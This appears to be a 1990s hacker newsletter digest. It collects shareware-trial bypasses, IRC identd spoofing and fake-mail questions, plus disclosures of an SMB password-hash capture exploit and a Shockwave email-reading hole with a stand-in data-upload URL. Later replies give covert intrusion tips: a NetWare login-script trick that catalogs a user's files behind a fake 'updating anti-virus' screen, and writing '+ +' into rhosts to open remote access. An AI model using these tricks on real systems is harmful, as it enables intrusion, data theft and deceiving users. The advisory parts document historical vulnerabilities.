   Circumventing Shareware Nags and Limitations 
==================================================

From: Trey Schultz <stwaldo@teleport.com>

Easy Out: 
Set your system clock(s) to Jan. 4, 2020.  Install shareware. 
Reset clock(s) to current date.  Viola, you have 20+ years to 
evaluate, you cheater, you! :)

Hard Out: 
Open regedit. Take a look around, find where app info is stored 
(there are several places, keep track of them all).  Install 
shareware.  Look for this new prog's reg entries. Look for install 
dates.  Change 'em.  Viola, you know how to use the registry, you 
cheater, you! :)

Elite Out: 
Hack the fat, 16 and 32 bit.  Write a utility to "freeze" the 
current installation of WinHoze.  Use it. Install shareware. 
If it gives you any flak down the road, "unfreeze" WinBlowz, 
reinstall shareware.

All three have been tried and succeeded for me.

This is kinda how things work..when you log onto an IRC server (a good 
one)they use Identd to check who you are. This is done, so if someone 
has a Netcom account, they can't fake their user name and get auto-ops 
on channels where bots are setup to auto up Netcom people.. I think 
how Identd works is that the questioning host sends it first to you, 
then to your ISP. Whoever made mIRC put in this little Identd program 
that scans for and Identd requests to you, and sends back whatever you 
have put in. This more or less lets you fake the first part of your 
user name. You can do this in fake mail to make it look like the mail 
came from you.are.lame@isp.net, but there is something added to the 
end of people's domain when they dial up that lets DNS servers get the 
IP. This isn't totally anonymusly, they ppl can just trace you through 
your IP.

Hey All, First off as the others said if your not using identd you our 
adevertising your user name on IRC. Second for most of the bigger 
service providers and most of the smaller ones as well. If you take 
the last two parts of the site when you do a whois on someone and 
stick it in your webrowser preceded by www you will go to there 
service providers home page. Which no doubt will give you dial up 
numbers and everything else under the sun. Example you do a whois on 
whoever and you get whoever@ppp15.mulbery.com type 
http://www.mulbery.com/ in your web browser and you got the 
information on their service provider, numbers for their pops, e.t.c. 
Another note on this is that many of the ISP's set their customers 
home directorys to /~whoever/ so If you want more info you can always 
type in that url and see if a home page comes up. The next point is 
even if you where using Identd to hide your real user name on IRC if 
you have ever advertised your e-mail address on channel or since you 
stated you where an op, if your e-mail address is in a channel faq, 
your giving your user name to them. For most ISPs use your user name 
in the e-mail address ie whoever@mulbery.com. With the e-mail address 
you got the user name from the first half and can get pertitnent info 
on the ISP from the second with the browser trick.Thus they got dial 
up numbers, and your user name, so 50% of the work is done for them, 
all they need to do is brute force your password with any of the 
available programs on the web. One last point before I go, is that if 
a person has an account on the same ISP as you do they can call the 
same pop as you do and through the use of identd and become you site 
and all as far as IRC is concerned, you can learn more on that at my 
site http://www.win.net/~cjc/fear/fear.html.

Later, 
 Crazy J

From: "Aileron" <aileron@aileron.com>

Hi all, 
  While port-surfing on a local ISP, I discovered that they were 
using an older version of Sendmail which has a potentially serious 
bug (The 7/8bit MIME thing in Sendmail 8.8.4). What's the best thing 
to do now? Kindly inform them that "Hey, I was snooping on your 
system and I could've broken into it..." or just leave it be? 
Thanks!

From: Nils Janson <Nils.Janson@munich.netsurf.de>

Although this has nothing to do with hacking (well, it does, in a way) 
I'm having trouble setting up my isdn card (Teles 16.3) with 
isdn4linux.  And PPP, for that matter.  For some reason, everytime 
that I try to insmod the bloody thing, or any other networking module, 
it says something to the effect of: Characters do not match those in 
(some file involving the kernal, like /usr/src/linux-2.0-18/<foo>). 
This means that I can't load Mr. ISDN or PPP module and I need to use 
my Win 95 box on the net.  Thanks, thanks, and more thanks.

From: Redington <nemesis@minot.com>

Whenever I try to send fake mail by port 25 I get as far as typing my 
message and I can't get it to stop and send it.  It says to end with a 
"." on a line by itself.  Whenever I try to do this it doesn't work. 
BTW the Unix server runs AIX 4.2 if that matters. Anticipated thanks.

         Internet Explorer Exploits 
===============================================

From: Aaron Spangler <pokee@MAXWELL.EE.WASHINGTON.EDU>

Included below is IE Bug#4 I would like to post. 
It can be found at:

http://www.ee.washington.edu/computing/iebug/

Internet Explorer Exploit #4

The exploit works for both Netscape Navigator 3.01 and Microsoft 
Internet Explorer 3.01 with Security Patches. (earlier versions should 
work as well, but have not yet been tested). 
Look below to see how it works. 
 

****How it Works******

Web page that points to a Rogue SMB Server

This web pages contains an embedded image (actually two).  The 
embedded images do not reside in this same directory as this web page. 
In fact, they reside on a SMB Lanman server (as opposed to an HTTP 
server). (View the source for this html to get a better idea what I am 
talking about). I borrowed this idea from the 
<A href=http://dec.dorm.umd.edu/>Last MS Internet Explorer Security 
Exploit.</A>

The modified SMB Server

In order for the client to download the images, the client needs to 
'logon' to the Lanman server.  Windows NT seems to do this without 
even asking the user for confirmation.  Windows NT simply forwards the 
username and encrypted version of the user's password to the Lanman 
server. The Lanman server code has been modified slightly to record 
Usernames and "Hashed Passwords" of the victims.  Also the code has 
been modified to supply the client with a <b>fixed</b> "Challenge seed 
value" for password encryption. (Thus making it even easier to decode 
the client passwords in the future.) See <a 
href=nt_pw_dict_attack.txt>NT Password Dictionary Attack</a> for where 
I got the Lanman server idea.

What's the big deal?

First of all, no remote web site should be able to record your 
username. If they do, then can compile junk email lists and sell your 
name. Secondly, if they have information on what your password might 
be, and they know what site you came from, they can gain access to 
your computer or local account.  (Thus compromising your security with 
you never knowing about it.) It is fairly easy to unencrypt a MS 
password if the challenge has set to zero via dictionary attacks. 
Sequential search brute force attacks work as well if you can guess 
what types of characters are most common in the password.  Yes, it is 
time consuming, but if your account gets hacked, is it really worth 
it?

It is interesting to note that in theory someone could setup a Lanman 
server that make a simultaneous connection back to the client as a 
connection comes in.  By simply relaying the same challenge and 
password back to the client, the remote server could gain network 
access to the vulnerable client.

<h4> Did you really get my username & hashed password? </h4> 
Take a look at the <a href=passout.txt>log so far.</a> Remember these 
passwords are easier to unencrypt because the challenge response is 
set to 
all zeros!

 New Netscape / Shockwave Bug 
================================================

From: ntsecurity@THEPENTAGON.COM

A new security hole was found in Netscape browsers, and possibly 
affects IE users as well. Shockwave lets a person read a user's email, 
and forward it out to places on the net at will - and according to one 
person, it looks like Java may allow this same thing to happen as 
well.

I've mirrored the original page here due to traffic loads over there:

                           SHOCKWAVE SECURITY ALERT 
  
 

   AKA :: How to use Shockwave to read people's Netscape email!

   10-Mar-97 --- reported by: David de Vitry

   What is this about? 
 

       This is about a security hole in Shockwave that allows 
malicious 
       webpage developers to create a Shockwave movie that will read 
       through a user's emails, and potentially upload them to a 
server. 
       All without the user knowing about it. In addition, there is a 
       risk to internal Web servers behind corporate firewalls, 
       regardless of the browser you use (Netscape or Internet 
Explorer), 
       as long as you have the current release of Shockwave. 
 

   Who could be affected? 
 

       Users of Netscape 3.0 (and 2.0?) on Win 95 / NT/ Mac with 
       Shockwave installed.  In addition, the user must not have 
upgraded 
       to "Communicator", (this just changes the directory structure) 
and 
       must use the Netscape browser to read their email. There may be 
       other browsers / platfroms affected by similar insecurities 
with 
       Shockwave 
  
 

   How is this done? 
 

       A developer can use Shockwave to access the user's Netscape 
email 
       folders. This is done assuming the name and path to the mailbox 
on 
       the users hard drive. For example names such as: Inbox, Outbox, 
       Sent and Trash are all default names for mail folders. The 
default 
       path to the "Inbox" on Win 95/NT would be: "C:/Program 
       Files/Netscape/Navigator/Mail/Inbox". Then the developer can 
use 
       the Shockwave command "GETNETTEXT" to call Navigator to query 
the 
       email folder for an email message. The results of this call can 
       then be feed into a variable, and later processed and sent to a 
       server. To access a message, for example, the first message in 
a 
       users Inbox, would be called using the following location:

       For Windows: mailbox:C:/Program 
       Files/Netscape/Navigator/Mail/Inbox?number=0

       For MacOS (thanks Jeremy Traub)

mailbox:/Macintosh%20HD/System%20Folder/Preferences/Netscape%20%C 
       4/Mail/Inbox?number=0

       Note: if these links all give you an error (such as folder no 
       longer exists), then you might not have anything to worry 
about. 
       However, if you see an email message in a pop up window, and 
you 
       have Shockwave installed, then you are vulnerable to this 
security 
       hole. 
 

   Show Me an example! Here it is, a Shockwave movie that will read 
your 
   email. This will not work for everyone, it is currently only setup 
to 
   work with Win95 / NT, but it could be extended to identify the 
browser 
   (Jeremy Traub).

   Interesting, but what is the security hole? 
 

       It doesn't stop at just the first messages of your inbox. 
       A shockwave program could increment through a users entire 
inbox, 
       outbox, sent, and trash email folder. This information could 
then 
       be sent back to a server (using a the GET method with a simple 
cgi 
       program. i.e.

http://www...com/upload.cgi?data=This_could_be_your_email_content_ 
       here), all with out the user ever noticing. Here are just a few 
       types of information that a malicious developer could obtain 
using 
       this hole: 
          + Your name and email 
          + Your friends names and emails 
          + User id's and passwords sent to you in email, and where 
and 
            how to use them. 
          + Personal email messages that you sent or received using 
            Netscape 
  
 

       The "GETNETTEXT" command also has other problems in that it can 
       access other http servers, including ones that are not on the 
       internet, ie, ones that are behind a corporate firewall. That 
is 
       if the movie is run from behind the firewall. This may be even 
a 
       bigger problem then the email one, however it affects only 
       corporate users. 
 

   Help: What can I do to protect myself? 
 

       There are a number of things that you could do to protect 
yourself 
       from malicious shockwave movies: 
          + Change the path to your mail folders 
          + Don't use Netscape to read or send email 
          + DeInstall Shockwave 
          + Don't go to potentially hostile sites. 
  
 

   What are people saying? -- please inform me of any other articles. 
     * Wired article 
     * Macromedia and Netscape have given me no official statements. 
       However, they are both in communication with me regarding this 
       issue. Macromedia did say that their newest product "Shockwave 
6," 
       currently in pre-release, does fix this problem. 
     * Microsoft did not want to talk with me about the issue, even 
       though there are risks to their users. They just blew me off 
       saying "There are obviously plenty of security bugs to go 
around." 
       Followed by, "Great, we're checking it out now."

If you have access to syscon from your location, it's REAL easy. 
Edit the user's login script and add whatever dos commands you want, 
just be 
sure to echo them to nowhere :-)

dir /s >f:\joefiles.txt 
(or whatever drive that's mapped to the server where you can get it 
later)

Thing I usually do in that situation is put a screen up for the user 
like:

Please wait, updating anti-virus files...

That way they don't think anything of the wait.... 
Then you can go back later and copy the files you want.  Works best if 
you make a special subdirectory for "loot".

You need to do a call from the users login script to a batch file in 
order to do the commands....

I've never heard of an NLM that would do this. Netware is server 
centric...not peer to peer. But there is a way to do this Managewise. 
This application will allow you to 'catalog' a workstations hard disk. 
Very handy utility. Managewise is the only thing I've heard of that 
will do what you are looking for.

From: yeo@poi.net

 I wanted to ask you a question on passwd files. why is it that 
sometimes passwd files have the users login and passwords encryped on 
it and the others on it just show the shadowed 'x' mark on it and 
sometimes the root password is on but not some of the other logins and 
they just have the shadowed marked 'x' ? I also wanted to know how 
people get caught password sniffing, please explain. 
 A friend of mine told me that people couldn't get root access 
on a system by telnet (which would be dumb) or dialup, only if you 
were physically at the sysadmin's computer. Is this true ?

It wasn't a very safe installation, one can easily edit the 
configuration file, and then, you can probably use an editor or other 
program which allows you to shell out. You can also peek around the 
entire system. Or you could just use it for web browsing if you 
haven't got access to a web browser.

An even better solution, which would not give you away as easily, 
would be to echo + + (wildcards in rhosts), so everyone could gain 
remote access.

There are many ways.

You could use vulnerabilities in finger, sendmail, cgi-scripts, and 
any other service you have access to. 
You could try to compile an unshadow program on the computer, if you 
have shell access or can upload and execute commands.

If you telnet into the server, yes. You could sz (send ZModem), or sx 
(Go figure), if you are connected through modem, or are using a telnet 
client which can handle ZModem/XModem.
